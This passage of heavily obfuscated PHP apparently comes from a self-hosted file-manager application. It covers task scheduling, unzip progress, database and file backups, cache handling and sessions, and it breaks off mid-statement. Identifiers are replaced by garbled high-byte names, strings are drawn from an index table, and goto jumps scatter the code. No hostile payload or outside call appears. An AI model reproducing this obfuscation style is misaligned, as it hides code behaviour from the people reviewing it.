(!$±•ñ±±Ò || timeFloat() - floatVal($±•ñ±±Ò) >= $À´íëÍÆ) { Cache::set($ı¡ëåÛŠ, timeFloat(), $À´íëÍÆ * 10); return !0; } return !1; } public static function timeLimitCall($±ãŠ’·, $ÏØ½ÌõÒ, $²æÌôÄ˜, $°®£®Œ = 5.0) { $©Ô¦Á‰ò =& $_SERVER[Îûáû“ş]; if (!$±ãŠ’· || !$ÏØ½ÌõÒ) { return; } self::$asyncAdd = !0; $µ¦¦ı© = $©Ô¦Á‰ò[1773]; $Ñ®éâãŒ = Cache::get($µ¦¦ı©, !0); $¹ÔÒñüñ = array($©Ô¦Á‰ò[1774] => timeFloat(), $©Ô¦Á‰ò[1775] => timeFloat(), $©Ô¦Á‰ò[264] => $ÏØ½ÌõÒ, $©Ô¦Á‰ò[1768] => $²æÌôÄ˜, $©Ô¦Á‰ò[180] => $°®£®Œ); if (is_array($Ñ®éâãŒ[$±ãŠ’·])) { $¹ÔÒñüñ[$©Ô¦Á‰ò[1775]] = $Ñ®éâãŒ[$±ãŠ’·][$©Ô¦Á‰ò[1775]]; } if (is_array($Ñ®éâãŒ[$±ãŠ’·])) { if (timeFloat() - $Ñ®éâãŒ[$±ãŠ’·][$©Ô¦Á‰ò[1774]] < $¹ÔÒñüñ[$©Ô¦Á‰ò[180]] * 0.3) { return; } $¹ÔÒñüñ[$©Ô¦Á‰ò[1775]] = $Ñ®éâãŒ[$±ãŠ’·][$©Ô¦Á‰ò[1775]]; } $Ñ®éâãŒ[$±ãŠ’·] = $¹ÔÒñüñ; Cache::set($µ¦¦ı©, $Ñ®éâãŒ, 60); Cache::removeMemory($µ¦¦ı©); write_log($©Ô¦Á‰ò[1776] . $±ãŠ’· . $©Ô¦Á‰ò[71] . $ÏØ½ÌõÒ, $©Ô¦Á‰ò[1770]); } public static function timeLimitCallLoop() { $²Ÿ­’×í =& $_SERVER[Îûáû“ş]; $±Äéæ©Ô = array($²Ÿ­’×í[1777]); $Ì¥Àå¸Ñ = in_array(strtolower(ACTION), $±Äéæ©Ô); if (!$Ì¥Àå¸Ñ && !self::$asyncAdd) { return; } $¹Ëì¿Ğ÷ = $²Ÿ­’×í[1773]; $Û´ØêÎ = Cache::get($¹Ëì¿Ğ÷, !0); if (!$Û´ØêÎ || count($Û´ØêÎ) <= 0) { return; } $ĞŠÏ¨Øç = !1; $„¥–ñßÛ = timeFloat(); $Àö«“‡Ó = array(); foreach ($Û´ØêÎ as $Õ¦‡„ÓÍ => $¬ÀĞ¢ı) { if ($„¥–ñßÛ - $¬ÀĞ¢ı[$²Ÿ­’×í[1775]] > $¬ÀĞ¢ı[$²Ÿ­’×í[180]]) { $ĞŠÏ¨Øç = !0; try { Hook::apply($¬ÀĞ¢ı[$²Ÿ­’×í[264]], $¬ÀĞ¢ı[$²Ÿ­’×í[1768]]); write_log($²Ÿ­’×í[1778] . $Õ¦‡„ÓÍ . $²Ÿ­’×í[71] . $¬ÀĞ¢ı[$²Ÿ­’×í[264]] . $²Ÿ­’×í[1779] . ACTION, $²Ÿ­’×í[1770]); } catch (Exception $¢¼¸ø›) { } continue; } $Àö«“‡Ó[$Õ¦‡„ÓÍ] = $¬ÀĞ¢ı; } if (!$ĞŠÏ¨Øç) { return; } if (!$Àö«“‡Ó) { return Cache::remove($¹Ëì¿Ğ÷); } Cache::set($¹Ëì¿Ğ÷, $Àö«“‡Ó, 60); Cache::removeMemory($¹Ëì¿Ğ÷); } public static function finished($¨ÅÎªç, $¥ÍšÈû) { $´öÓ ã =& $_SERVER[Îûáû“ş]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($´öÓ ã[264] => $¨ÅÎªç, $´öÓ ã[1768] => $¥ÍšÈû); } private static function finishedRun() { $®‚½¿øŠ =& $_SERVER[Îûáû“ş]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $³ŸÔÉÏ) { try { Hook::apply($³ŸÔÉÏ[$®‚½¿øŠ[264]], $³ŸÔÉÏ[$®‚½¿øŠ[1768]]); } catch (Exception $ĞÆôÒÀ¡) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $€àÌ›‹¸ =& $_SERVER[Îûáû“ş]; parent::startAfter(); Hook::bind($€àÌ›‹¸[1780], array($this, $€àÌ›‹¸[1781])); Hook::bind($€àÌ›‹¸[1195], array($this, $€àÌ›‹¸[1782])); $ïÖÁ¿ü˜ =& $this->task; $ïÖÁ¿ü˜[$€àÌ›‹¸[1783]] = $€àÌ›‹¸[1196]; if (!$ïÖÁ¿ü˜[$€àÌ›‹¸[1570]]) { $ïÖÁ¿ü˜[$€àÌ›‹¸[1570]] = LNG($€àÌ›‹¸[1784]); } } protected function endAfter() { $ğñ˜ÙØÒ =& $_SERVER[Îûáû“ş]; parent::endAfter(); Hook::unbind($ğñ˜ÙØÒ[1780], array($this, $ğñ˜ÙØÒ[1781])); Hook::unbind($ğñ˜ÙØÒ[1195], array($this, $ğñ˜ÙØÒ[1782])); } public function updateAfter() { $Ó†ÙØ¾ =& $_SERVER[Îûáû“ş]; $³‚¦î’ =& $this->task; if (!$³‚¦î’[$Ó†ÙØ¾[785]] || !$³‚¦î’[$Ó†ÙØ¾[762]]) { return; } if ($³‚¦î’[$Ó†ÙØ¾[1783]] == $Ó†ÙØ¾[1196]) { $¤ë–’™ì = 0; if ($³‚¦î’[$Ó†ÙØ¾[1723]]) { $¤ë–’™ì = $³‚¦î’[$Ó†ÙØ¾[1724]] / $³‚¦î’[$Ó†ÙØ¾[1723]]; } $³‚¦î’[$Ó†ÙØ¾[1672]] = $¤ë–’™ì * 0.3; } else { if ($³‚¦î’[$Ó†ÙØ¾[1783]] == $Ó†ÙØ¾[313]) { $¤ë–’™ì = $³‚¦î’[$Ó†ÙØ¾[1671]] / $³‚¦î’[$Ó†ÙØ¾[785]]; $³‚¦î’[$Ó†ÙØ¾[1672]] = 0.3 + $¤ë–’™ì * 0.4; } else { if ($³‚¦î’[$Ó†ÙØ¾[1783]] == $Ó†ÙØ¾[107]) { $Æ½ä÷´š = 0; if ($³‚¦î’[$Ó†ÙØ¾[1725]] == $Ó†ÙØ¾[107]) { $Æ½ä÷´š = $³‚¦î’[$Ó†ÙØ¾[1724]]; } $¤ë–’™ì = ($³‚¦î’[$Ó†ÙØ¾[1728]] + $Æ½ä÷´š) / $³‚¦î’[$Ó†ÙØ¾[762]]; $³‚¦î’[$Ó†ÙØ¾[1672]] = 0.3 + 0.4 + $¤ë–’™ì * 0.3; } } } if ($³‚¦î’[$Ó†ÙØ¾[1672]] > 0) { $«´Ú›š” = timeFloat() - $³‚¦î’[$Ó†ÙØ¾[1674]] - $³‚¦î’[$Ó†ÙØ¾[1677]]; $³‚¦î’[$Ó†ÙØ¾[1678]] = $«´Ú›š” * (1 - $³‚¦î’[$Ó†ÙØ¾[1672]]) / $³‚¦î’[$Ó†ÙØ¾[1672]]; } } public function addFile($±øµëŞ§) { $‡ñ´Óå =& $_SERVER[Îûáû“ş]; $ô¨Ê©ú» =& $this->task; $Œ¾ç£€ = IO::info($±øµëŞ§); $ô¨Ê©ú»[$‡ñ´Óå[1721]] = $Œ¾ç£€[$‡ñ´Óå[32]]; $ô¨Ê©ú»[$‡ñ´Óå[1723]] = $Œ¾ç£€[$‡ñ´Óå[76]]; $ô¨Ê©ú»[$‡ñ´Óå[1724]] = 0; $ô¨Ê©ú»[$‡ñ´Óå[1066]] = $‡ñ´Óå[1744]; $ô¨Ê©ú»[$‡ñ´Óå[1725]] = $‡ñ´Óå[1196]; $ô¨Ê©ú»[$‡ñ´Óå[762]] = $Œ¾ç£€[$‡ñ´Óå[76]]; $ô¨Ê©ú»[$‡ñ´Óå[785]] = 1; $Ì ¾…‰ = 0; $ô¨Ê©ú»[$‡ñ´Óå[1732]] = array($‡ñ´Óå[1733] => $Ì ¾…‰ + 1, $‡ñ´Óå[420] => $Œ¾ç£€[$‡ñ´Óå[32]], $‡ñ´Óå[84] => $Œ¾ç£€[$‡ñ´Óå[84]], $‡ñ´Óå[509] => $Œ¾ç£€[$‡ñ´Óå[509]] ? $Œ¾ç£€[$‡ñ´Óå[509]] : $Œ¾ç£€[$‡ñ´Óå[84]]); $this->update(); } public function unzipAfter($Û±¦ØÉ) { $¦êÓİäõ =& $_SERVER[Îûáû“ş]; $ÙÔåşâå =& $this->task; $ÙÔåşâå[$¦êÓİäõ[1783]] = $¦êÓİäõ[107]; $²—Š›•÷ = IO::infoWithChildren($Û±¦ØÉ); $™ûÚèçû = 0; $ÙÔåşâå[$¦êÓİäõ[1732]] = array($¦êÓİäõ[1733] => $™ûÚèçû + 1, $¦êÓİäõ[420] => $²—Š›•÷[$¦êÓİäõ[32]], $¦êÓİäõ[84] => $²—Š›•÷[$¦êÓİäõ[84]], $¦êÓİäõ[509] => $²—Š›•÷[$¦êÓİäõ[509]] ? $²—Š›•÷[$¦êÓİäõ[509]] : $²—Š›•÷[$¦êÓİäõ[84]]); if ($²—Š›•÷[$¦êÓİäõ[33]] == $¦êÓİäõ[200]) { $ÙÔåşâå[$¦êÓİäõ[785]] = 1; } else { $ÙÔåşâå[$¦êÓİäõ[785]] = $²—Š›•÷[$¦êÓİäõ[79]][$¦êÓİäõ[77]]; } $ÙÔåşâå[$¦êÓİäõ[1066]] = $¦êÓİäõ[12]; $ÙÔåşâå[$¦êÓİäõ[1725]] = 0; $ÙÔåşâå[$¦êÓİäõ[1671]] = 0; $ÙÔåşâå[$¦êÓİäõ[1723]] = 0; $ÙÔåşâå[$¦êÓİäõ[1724]] = 0; $ÙÔåşâå[$¦êÓİäõ[1721]] = $¦êÓİäõ[12]; $ÙÔåşâå[$¦êÓİäõ[1728]] = 0; $ÙÔåşâå[$¦êÓİäõ[762]] = $²—Š›•÷[$¦êÓİäõ[76]]; $this->update(); self::log($¦êÓİäõ[1785] . json_encode(array($ÙÔåşâå, $²—Š›•÷))); } public function nameParse($‘¿Ñ¿»ƒ) { $ŞªÓöÑŒ =& $_SERVER[Îûáû“ş]; $çÂ–†•Æ =& $this->task; if ($çÂ–†•Æ[$ŞªÓöÑŒ[1783]] == $ŞªÓöÑŒ[1196]) { $çÂ–†•Æ[$ŞªÓöÑŒ[1783]] = $ŞªÓöÑŒ[313]; $çÂ–†•Æ[$ŞªÓöÑŒ[1728]] = 0; $çÂ–†•Æ[$ŞªÓöÑŒ[762]] = 0; } $‹ÂÕıûı = get_path_this($‘¿Ñ¿»ƒ); if (strstr($‹ÂÕıûı, $ŞªÓöÑŒ[10])) { $çÂ–†•Æ[$ŞªÓöÑŒ[1671]] += 1; $çÂ–†•Æ[$ŞªÓöÑŒ[785]] += 1; } $çÂ–†•Æ[$ŞªÓöÑŒ[1721]] = $‘¿Ñ¿»ƒ; $this->update(); } } goto E­‚¾³å¤Ï; E‰×µøÕÛ…: class BackupDbFile { public function __construct() { } public function index() { $”»ÂÉ«È =& $_SERVER[Îûáû“ş]; $³ƒ˜ÓéŸ = Backup::get(); $ÃÅìÕ”å = $³ƒ˜ÓéŸ[$”»ÂÉ«È[32]]; $ßÍ´“’ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\165\x70\x5f{$ÃÅìÕ”å}\x2f"; $³ı°ÌÛº = $this->backupPath($³ƒ˜ÓéŸ); if (!($³ı°ÌÛº = IO::mkdir($³ı°ÌÛº))) { return !1; } $¼ê°‰£¹ = IO::listPath($ßÍ´“’); $Ä‰Æ™· = isset($¼ê°‰£¹[$”»ÂÉ«È[83]]) ? $¼ê°‰£¹[$”»ÂÉ«È[83]] : array(); $ŞÛß±ó¿ = array_sum(array_column($Ä‰Æ™·, $”»ÂÉ«È[76])); if (!$ŞÛß±ó¿) { return !1; } $ÕÛşòÇ“ = array($”»ÂÉ«È[797] => $ŞÛß±ó¿, $”»ÂÉ«È[798] => time()); Backup::set($ÕÛşòÇ“); $‰ÍÀëøƒ = new TaskFileTransfer($”»ÂÉ«È[799], $”»ÂÉ«È[779], count($Ä‰Æ™·), LNG($”»ÂÉ«È[780]) . $”»ÂÉ«È[386] . LNG($”»ÂÉ«È[782]) . $”»ÂÉ«È[800]); $‰ÍÀëøƒ->task[$”»ÂÉ«È[762]] = $ŞÛß±ó¿; foreach ($¼ê°‰£¹[$”»ÂÉ«È[83]] as $Ò›‰É†) { $¾Å½£Å• = IO::move($Ò›‰É†[$”»ÂÉ«È[84]], $³ı°ÌÛº); if (!$¾Å½£Å•) { $‰ÍÀëøƒ->end(); $„±Ù¾Ø = IO::getLastError($”»ÂÉ«È[801] . $Ò›‰É†[$”»ÂÉ«È[84]] . $”»ÂÉ«È[802] . $³ı°ÌÛº . $”»ÂÉ«È[164]); write_log($„±Ù¾Ø, $”»ÂÉ«È[779]); return !1; } } $èè˜ú£ = new DbManage(); $ï¤Ê•„Œ = $èè˜ú£->getSqlFile(); if (!$ï¤Ê•„Œ[$”»ÂÉ«È[803]] || !$ï¤Ê•„Œ[$”»ÂÉ«È[13]]) { return !1; } IO::move($ï¤Ê•„Œ[$”»ÂÉ«È[803]], $³ı°ÌÛº); IO::move($ï¤Ê•„Œ[$”»ÂÉ«È[13]], $³ı°ÌÛº); $‰ÍÀëøƒ->end(); $ÕÛşòÇ“ = array($”»ÂÉ«È[804] => $ŞÛß±ó¿, $”»ÂÉ«È[805] => time()); Backup::set($ÕÛşòÇ“); return !0; } private function backupPath($Ìœş³Ş) { $íÖ““Éè =& $_SERVER[Îûáû“ş]; $ö»…ä§ = $Ìœş³Ş[$íÖ““Éè[32]]; $ó££Ï²Û = Model($íÖ““Éè[769])->get($íÖ““Éè[770]); $íØãÀòĞ = substr(md5($íÖ““Éè[771] . $ó££Ï²Û . $ö»…ä§), 0, 8); return "\173\151\x6f\72{$Ìœş³Ş[$íÖ““Éè[750]]}\175\x2f\144\x61\x74\141\142\x61\x73\145\x2f\142\x61\x63\153\165\x70\x2f" . $ö»…ä§ . $íÖ““Éè[11] . $íØãÀòĞ; } private function tmpFilesPath() { $ ï›ôÒ‰ =& $_SERVER[Îûáû“ş]; $úÌçå¶ì = TEMP_FILES; if ($GLOBALS[$ ï›ôÒ‰[6]][$ ï›ôÒ‰[89]][$ ï›ôÒ‰[795]]) { $úÌçå¶ì = $GLOBALS[$ ï›ôÒ‰[6]][$ ï›ôÒ‰[89]][$ ï›ôÒ‰[795]]; if (!mk_dir($úÌçå¶ì) || !is_writable($úÌçå¶ì) || !IO::mkfile($úÌçå¶ì . $ ï›ôÒ‰[796])) { $úÌçå¶ì = TEMP_FILES; } } return $úÌçå¶ì; } } class BackupFile { public function __construct() { } public function index() { $–§­ÏÉÂ = Backup::get(); $ÊÃØÒ = $–§­ÏÉÂ[$_SERVER[Îûáû“ş][293]][$_SERVER[Îûáû“ş][200]][$_SERVER[Îûáû“ş][468]]; $ßÀœ¿Ä = array($_SERVER[Îûáû“ş][469] => array($_SERVER[Îûáû“ş][806], $ÊÃØÒ), $_SERVER[Îûáû“ş][807] => array($_SERVER[Îûáû“ş][331], $–§­ÏÉÂ[$_SERVER[Îûáû“ş][750]])); $ü‚¿Ì† = (int) Model($_SERVER[Îûáû“ş][788])->where($ßÀœ¿Ä)->count($_SERVER[Îûáû“ş][468]); $“Šƒ³” = (int) Model($_SERVER[Îûáû“ş][788])->where($ßÀœ¿Ä)->sum($_SERVER[Îûáû“ş][76]); $¬‰Ó¾ÀŠ = new TaskFileTransfer($_SERVER[Îûáû“ş][808], $_SERVER[Îûáû“ş][779], $ü‚¿Ì†, LNG($_SERVER[Îûáû“ş][780]) . $_SERVER[Îûáû“ş][781] . LNG($_SERVER[Îûáû“ş][809])); $¬‰Ó¾ÀŠ->task[$_SERVER[Îûáû“ş][762]] = $“Šƒ³”; $Áñ¡ºÀ» = array($_SERVER[Îûáû“ş][810] => $ü‚¿Ì†, $_SERVER[Îûáû“ş][811] => $“Šƒ³”, $_SERVER[Îûáû“ş][812] => time()); Backup::set($Áñ¡ºÀ»); $¿§…×ß· = !0; $Ö…íÀ€« = $this->storeIds(); $éá¶Ø€¤ = 1; $’£ªÈ = 1000; $°ı¯ ã = $Õ¡Â½˜È = 0; $ä‹È”ğ³ = array(); $æ˜ËÈ« = $³§àÔ­è = 0; do { $¨–¥¨²û = $_SERVER[Îûáû“ş][813]; $İÙ¿¦ìÁ = Model($_SERVER[Îûáû“ş][788])->where($ßÀœ¿Ä)->field($¨–¥¨²û)->order($_SERVER[Îûáû“ş][814])->selectPage($’£ªÈ, $éá¶Ø€¤); $ôÀÙÜºË = !empty($İÙ¿¦ìÁ[$_SERVER[Îûáû“ş][369]]) ? $İÙ¿¦ìÁ[$_SERVER[Îûáû“ş][369]] : array(); foreach ($ôÀÙÜºË as $½ü¡ÕõŠ) { if (!$this->_fileExist($½ü¡ÕõŠ, $ä‹È”ğ³, $Ö…íÀ€«)) { $ü‚¿Ì† -= 1; $“Šƒ³” -= (int) $½ü¡ÕõŠ[$_SERVER[Îûáû“ş][76]]; write_log("\x66\x69\x6c\145\40\156\157\x74\40\x65\170\x69\163\x74\x2e\x66\x69\154\145\111\x44\72{$½ü¡ÕõŠ[$_SERVER[Îûáû“ş][468]]}\x2c\40\x70\x61\164\150\x3a{$½ü¡ÕõŠ[$_SERVER[Îûáû“ş][84]]}", $_SERVER[Îûáû“ş][815]); continue; } $ğ™¤Ÿ¶ú = $½ü¡ÕõŠ[$_SERVER[Îûáû“ş][84]]; $èĞ¾ß™´ = "\173\151\157\x3a{$–§­ÏÉÂ[$_SERVER[Îûáû“ş][750]]}\x7d" . substr($ğ™¤Ÿ¶ú, strlen("\173\151\x6f\x3a{$½ü¡ÕõŠ[$_SERVER[Îûáû“ş][816]]}\x7d")); if (IO::exist($èĞ¾ß™´)) { $¬‰Ó¾ÀŠ->updateFileEnd($½ü¡ÕõŠ[$_SERVER[Îûáû“ş][32]], $½ü¡ÕõŠ[$_SERVER[Îûáû“ş][76]]); } else { $èĞ¾ß™´ = get_path_father($èĞ¾ß™´); IO::mkdir($èĞ¾ß™´); if (!IO::copy($ğ™¤Ÿ¶ú, $èĞ¾ß™´, $_SERVER[Îûáû“ş][817])) { write_log($_SERVER[Îûáû“ş][818] . $ğ™¤Ÿ¶ú . $_SERVER[Îûáû“ş][802] . $èĞ¾ß™´ . $_SERVER[Îûáû“ş][164], $_SERVER[Îûáû“ş][779]); $¿§…×ß· = !1; break; } } $ÊÃØÒ = $½ü¡ÕõŠ[$_SERVER[Îûáû“ş][468]]; $Õ¡Â½˜È += 1; $°ı¯ ã += $½ü¡ÕõŠ[$_SERVER[Îûáû“ş][76]]; $³§àÔ­è += 1; $æ˜ËÈ« += $½ü¡ÕõŠ[$_SERVER[Îûáû“ş][76]]; if ($°ı¯ ã >= 1024 * 1024 * 100) { $Áñ¡ºÀ» = array($_SERVER[Îûáû“ş][819] => $ÊÃØÒ, $_SERVER[Îûáû“ş][820] => $³§àÔ­è, $_SERVER[Îûáû“ş][821] => $æ˜ËÈ«); Backup::set($Áñ¡ºÀ»); $°ı¯ ã = $Õ¡Â½˜È = 0; } } $®÷ÇÓä… = count($ôÀÙÜºË); $éá¶Ø€¤++; } while ($®÷ÇÓä… == $’£ªÈ); $¬‰Ó¾ÀŠ->end(); $Áñ¡ºÀ» = array($_SERVER[Îûáû“ş][822] => 1, $_SERVER[Îûáû“ş][760] => time(), $_SERVER[Îûáû“ş][774] => 1, $_SERVER[Îûáû“ş][819] => $ÊÃØÒ, $_SERVER[Îûáû“ş][811] => $“Šƒ³”, $_SERVER[Îûáû“ş][810] => $ü‚¿Ì†, $_SERVER[Îûáû“ş][823] => time()); if ($Õ¡Â½˜È) { $Áñ¡ºÀ»[$_SERVER[Îûáû“ş][820]] = $³§àÔ­è; $Áñ¡ºÀ»[$_SERVER[Îûáû“ş][821]] = $æ˜ËÈ«; } Backup::set($Áñ¡ºÀ»); $this->_fileFilter($ä‹È”ğ³); return !0; } private function _fileExist($øœ·çÀÑ, &$ÏÅŒ¹¬ö, $Š‚¢½—) { $šÓéğïĞ =& $_SERVER[Îûáû“ş]; $¬¥êïçì = $øœ·çÀÑ[$šÓéğïĞ[84]]; if (in_array($øœ·çÀÑ[$šÓéğïĞ[468]], $ÏÅŒ¹¬ö)) { return !1; } if (!in_array($øœ·çÀÑ[$šÓéğïĞ[816]], $Š‚¢½—)) { return !1; } if (IO::exist($¬¥êïçì)) { return !0; } $¹Ü´ÜÄ = get_path_father($¬¥êïçì); if (IO::exist($¹Ü´ÜÄ)) { $ÏÅŒ¹¬ö[] = $øœ·çÀÑ[$šÓéğïĞ[468]]; return !1; } $áÇß½‹¹ = array($šÓéğïĞ[816] => $øœ·çÀÑ[$šÓéğïĞ[816]], $šÓéğïĞ[84] => array($šÓéğïĞ[383], "{$¹Ü´ÜÄ}\45")); $æòÚ½´ = Model($šÓéğïĞ[788])->where($áÇß½‹¹)->field($šÓéğïĞ[469])->select(); $ÏÅŒ¹¬ö = array_merge($ÏÅŒ¹¬ö, array_to_keyvalue($æòÚ½´, $šÓéğïĞ[12], $šÓéğïĞ[468])); return !1; } private function _fileFilter($ë€ƒä»¶) { $ÍéÍ¶´› =& $_SERVER[Îûáû“ş]; if (empty($ë€ƒä»¶)) { return; } $Æºƒ²—Ó = array($ÍéÍ¶´›[468] => array($ÍéÍ¶´›[7], array_unique($ë€ƒä»¶))); $Úš–¯àÛ = Model($ÍéÍ¶´›[824])->where($Æºƒ²—Ó)->field($ÍéÍ¶´›[402])->select(); foreach ($Úš–¯àÛ as $úô¨£Æ) { Model($ÍéÍ¶´›[824])->remove($úô¨£Æ[$ÍéÍ¶´›[402]], !1); } } private function storeIds() { $›‚Æş»• =& $_SERVER[Îûáû“ş]; $åÉÇ¹É¸ = Model($›‚Æş»•[766])->listData(); $ª¿ğòâä = array(); $Î¸à¯ğš = $GLOBALS[$›‚Æş»•[6]][$›‚Æş»•[89]][$›‚Æş»•[825]]; foreach ($åÉÇ¹É¸ as $çŠÔ–˜¾) { $¥Æ¶ç£ = strtolower($çŠÔ–˜¾[$›‚Æş»•[95]]); if (!isset($Î¸à¯ğš[$¥Æ¶ç£])) { continue; } $Ó†¼‰ùÑ = $›‚Æş»•[74] . (isset($Î¸à¯ğš[$¥Æ¶ç£]) ? $Î¸à¯ğš[$¥Æ¶ç£] : ucfirst($¥Æ¶ç£)); if (!class_exists($Ó†¼‰ùÑ)) { continue; } $ª¿ğòâä[] = $çŠÔ–˜¾[$›‚Æş»•[399]]; } return $ª¿ğòâä; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Ïã²…Àæ =& $_SERVER[Îûáû“ş]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $üüŸ¹Ûğ = $GLOBALS[$Ïã²…Àæ[6]][$Ïã²…Àæ[349]]; $ëÔÍµÊ¬ = $üüŸ¹Ûğ[$üüŸ¹Ûğ[$Ïã²…Àæ[826]]]; $¬è’ßïĞ = $üüŸ¹Ûğ[$Ïã²…Àæ[827]]; switch ($üüŸ¹Ûğ[$Ïã²…Àæ[826]]) { case $Ïã²…Àæ[21]: self::$handle = Model($Ïã²…Àæ[828]); break; case $Ïã²…Àæ[829]: self::$handle = new CacheRedis($ëÔÍµÊ¬, $¬è’ßïĞ); break; case $Ïã²…Àæ[830]: self::$handle = new CacheMemcached($ëÔÍµÊ¬, $¬è’ßïĞ); break; case $Ïã²…Àæ[200]: self::$handle = new CacheFile($ëÔÍµÊ¬, $¬è’ßïĞ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ËÌƒ›®Ä) { if (is_array($ËÌƒ›®Ä) || is_object($ËÌƒ›®Ä)) { $ËÌƒ›®Ä = json_encode($ËÌƒ›®Ä); } $ËÌƒ›®Ä = rawurlencode($ËÌƒ›®Ä); return md5(KOD_SITE_ID . $_SERVER[Îûáû“ş][11] . $ËÌƒ›®Ä); } public static function get($¦àËÙÜÄ, $¸µó”ö = false) { $–­–®äÜ = self::key($¦àËÙÜÄ); if ($¸µó”ö) { return unserialize(self::init()->get($–­–®äÜ)); } if (!isset(self::$memoryCache[$–­–®äÜ])) { $÷óøÄ¥ô = self::init()->get($–­–®äÜ); self::$memoryCache[$–­–®äÜ] = unserialize($÷óøÄ¥ô); } return self::$memoryCache[$–­–®äÜ]; } public static function set($¼–°İ“õ, $Œ½ìŠŠ’, $‘¯æ¨ÃÃ = false) { $ œğûù = self::key($¼–°İ“õ); if (isset(self::$memoryCache[$ œğûù]) && self::$memoryCache[$ œğûù] === $Œ½ìŠŠ’) { return !0; } if ($‘¯æ¨ÃÃ === 0) { self::$memoryCache[$ œğûù] = $Œ½ìŠŠ’; return !0; } CacheLock::lock($¼–°İ“õ); $Äã¿³¬¢ = self::init()->set($ œğûù, serialize($Œ½ìŠŠ’), $‘¯æ¨ÃÃ); self::$memoryCache[$ œğûù] = $Œ½ìŠŠ’; CacheLock::unlock($¼–°İ“õ); return $Äã¿³¬¢; } public static function getCall($¯äÇ‚å‘, $ôˆùò•, $ïúú“ËŞ, $Á«¦©ç½ = array()) { $«Ø÷‡³ =& $_SERVER[Îûáû“ş]; $ƒûª–ïê = self::get($¯äÇ‚å‘); if ($ƒûª–ïê || $ƒûª–ïê === $«Ø÷‡³[12]) { return $ƒûª–ïê; } $ƒûª–ïê = call_user_func_array($ïúú“ËŞ, $Á«¦©ç½); $ƒûª–ïê = $ƒûª–ïê ? $ƒûª–ïê : $«Ø÷‡³[12]; self::set($¯äÇ‚å‘, $ƒûª–ïê, $ôˆùò•); return $ƒûª–ïê; } public static function remove($±‡¸İı«) { $Í…Å¡ß§ = self::key($±‡¸İı«); unset(self::$memoryCache[$Í…Å¡ß§]); self::clearTimeout(); CacheLock::lock($±‡¸İı«); $Ç€“Õ¥¯ = self::init()->remove($Í…Å¡ß§); CacheLock::unlock($±‡¸İı«); return $Ç€“Õ¥¯; } public static function removeMemory($‡•ˆİ¯®) { $‡Ê ¶é» = self::key($‡•ˆİ¯®); unset(self::$memoryCache[$‡Ê ¶é»]); } public static function clearMemory($ƒ²çàö = false) { if ($ƒ²çàö) { $ƒ²çàö = self::key($ƒ²çàö); unset(self::$memoryCache[$ƒ²çàö]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Îûáû“ş][831])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Îûáû“ş][832])) { self::init()->clearTimeout(); } } } goto A¤Ï½‰÷Áø; a´„·è‡íª: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ô½€ú–µ =& $_SERVER[Îûáû“ş]; static $º‘ø¿©¾ = false; if ($º‘ø¿©¾) { return $º‘ø¿©¾; } $ÓÂÔáÏ¿ = $GLOBALS[$Ô½€ú–µ[6]][$Ô½€ú–µ[349]]; self::$sessionTime = $ÓÂÔáÏ¿[$Ô½€ú–µ[1625]]; $½ôİŒ¯¾ = isset($GLOBALS[$Ô½€ú–µ[1626]]) ? $GLOBALS[$Ô½€ú–µ[1626]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($½ôİŒ¯¾)) { self::$sessionSign = Cookie::get($½ôİŒ¯¾); } else { self::$sessionSign = guid(); } } Cookie::setSafe($½ôİŒ¯¾, self::$sessionSign, self::$sessionTime); $Â¤Àç = $ÓÂÔáÏ¿[$Ô½€ú–µ[1627]]; $àš¦¡ˆ† = $ÓÂÔáÏ¿[$Â¤Àç]; $İ­º¦©ş = $ÓÂÔáÏ¿[$Ô½€ú–µ[827]]; switch ($Â¤Àç) { case $Ô½€ú–µ[21]: self::$handle = Model($Ô½€ú–µ[828]); break; case $Ô½€ú–µ[829]: self::$handle = new CacheRedis($àš¦¡ˆ†, $İ­º¦©ş); break; case $Ô½€ú–µ[830]: self::$handle = new CacheMemcached($àš¦¡ˆ†, $İ­º¦©ş); break; case $Ô½€ú–µ[200]: $àš¦¡ˆ†[$Ô½€ú–µ[84]] = $àš¦¡ˆ†[$Ô½€ú–µ[84]] . $Ô½€ú–µ[1628]; self::$handle = new CacheFile($àš¦¡ˆ†, $İ­º¦©ş); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $º‘ø¿©¾ = new self(); return $º‘ø¿©¾; } public static function getBySign($å·Æ¸¤ú) { $·Í¦Éˆ = self::$handle->get($å·Æ¸¤ú); $·Í¦Éˆ = unserialize($·Í¦Éˆ); return is_array($·Í¦Éˆ) ? $·Í¦Éˆ : array(); } public static function setBySign($‰Ó»°ÂÕ, $Œ’ÙÑ¶) { CacheLock::lock($‰Ó»°ÂÕ); self::$handle->set($‰Ó»°ÂÕ, serialize($Œ’ÙÑ¶), self::$sessionTime); CacheLock::unlock($‰Ó»°ÂÕ); } public static function sign($”Œ”ùùê = false) { $”Œ”ùùê && (self::$sessionSign = $”Œ”ùùê); self::init(); return self::$sessionSign; } public static function set($Æ½ÒÆƒ, $›ŠÛ¯Ã· = false) { self::init(); if (is_array($Æ½ÒÆƒ)) { foreach ($Æ½ÒÆƒ as $²åÕòÒ => $Ç®±ÑªØ) { array_set_value(self::$data, $²åÕòÒ, $Ç®±ÑªØ); } } else { array_set_value(self::$data, $Æ½ÒÆƒ, $›ŠÛ¯Ã·); } self::setBySign(self::$sessionSign, self::$data); } public static function get($È˜îî©÷ = false) { self::init(); if (!$È˜îî©÷) { return self::$data; } return array_get_value(self::$data, $È˜îî©÷); } public static function remove($÷Éş„Š) { self::init(); unset(self::$data[$÷Éş„Š]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = 